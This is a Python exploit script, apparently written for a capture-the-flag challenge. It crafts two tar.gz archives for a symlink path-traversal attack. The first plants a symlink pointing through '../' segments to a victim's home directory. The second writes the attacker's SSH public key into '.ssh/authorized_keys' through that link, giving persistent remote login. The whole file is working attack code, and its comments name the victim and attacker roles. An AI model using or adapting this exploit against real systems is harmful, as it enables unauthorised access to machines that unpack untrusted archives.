import socket
import tarfile
import os

RANDOM_DIR_NAME = "my_directory"  # Define random directory names

def build_tar_gz_1(tar_gz_file):
    obj1 = tarfile.TarInfo()
    obj1.name = "{}".format(RANDOM_DIR_NAME)  # Set the name of the soft link
    obj1.mode = 0o777  # Set permissions
    obj1.type = tarfile.SYMTYPE  # Set as a soft link
    obj1.linkname = "../../../../../../../home/Cyberlandslagnissen/"  # Replace with the actual victim machine home directory path

    with tarfile.open(tar_gz_file, "w:gz") as tar:
        tar.addfile(obj1)  # Add soft link to tar.gz

def build_tar_gz_2(tar_gz_file, ssh_pubkey):
    obj1 = tarfile.TarInfo()
    obj1.name = "{}/.ssh/".format(RANDOM_DIR_NAME)
    obj1.mode = 0o700
    obj1.type = tarfile.DIRTYPE

    obj2 = tarfile.TarInfo()
    obj2.name = "{}/.ssh/authorized_keys".format(RANDOM_DIR_NAME)
    obj2.mode = 0o400
    obj2.type = tarfile.REGTYPE
    obj2.size = os.path.getsize(ssh_pubkey)

    with tarfile.open(tar_gz_file, "w:gz") as tar:
        tar.addfile(obj1)  # Add .ssh directory
        with open(ssh_pubkey, "rb") as f:
            tar.addfile(obj2, f) # Add authorized_keys file

# Create 1tar.gz file
tar_gz_file = "my_archive1.tar.gz"
build_tar_gz_1(tar_gz_file)  # Create a tar.gz file containing soft links

# Create 2tar.gz file
tar_gz_file = "my_archive2.tar.gz"
ssh_pubkey = "/Users/jonathan/.ssh/cybertalent.pub"  # Replace with the attacker's actual SSH public key path
build_tar_gz_2(tar_gz_file, ssh_pubkey)  # Create a tar.gz file containing the SSH configuration
